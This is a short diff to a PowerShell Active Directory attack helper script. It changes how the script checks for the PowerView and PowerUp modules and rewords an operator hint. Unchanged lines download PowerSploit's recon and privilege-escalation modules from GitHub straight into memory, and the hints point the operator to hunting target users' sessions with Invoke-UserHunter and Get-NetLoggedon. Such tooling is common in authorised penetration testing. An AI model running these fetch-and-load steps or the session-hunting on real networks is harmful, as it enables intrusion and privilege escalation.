@@ -56,7 +56,7 @@ Write-Host "Importing powerview and powerup modules"
 ## Import powerview and powerup modules
 
 ## Check for PowerView module and download if missing
-if (-not (Get-DomainUser)) {
+if (-not (Get-Help Get-DomainUser)) {
     Write-Output "PowerView module not found, downloading into memory..."
     try {
       $pwContent = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
@@ -70,7 +70,7 @@ if (-not (Get-DomainUser)) {
    }
 
 ## Check for PowerUp module and download if missing
-if (-not (Invoke-AllChecks)) {
+if (-not (Get-Help Invoke-AllChecks)) {
     Write-Output "PowerUp module not found, downloading into memory..."
     try {
       $pwContent = (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1')
@@ -108,7 +108,7 @@ Write-Host "`n"
 
 
 Write-Host "[!] Remember to re-run bloodhound or enum after every new user/machine access!"
-Write-Host "[*] Invoke-UserHunter for users/groups you want to target - will show all active sessions for users/users of specified groups"
+Write-Host "[*] Invoke-UserHunter for users/groups you want to target - will return all active sessions"
 Write-Host "[*] Get-NetLoggedon –ComputerName (needs localadmin) or similar to hunt a machine"
 Write-Host "`n"
 
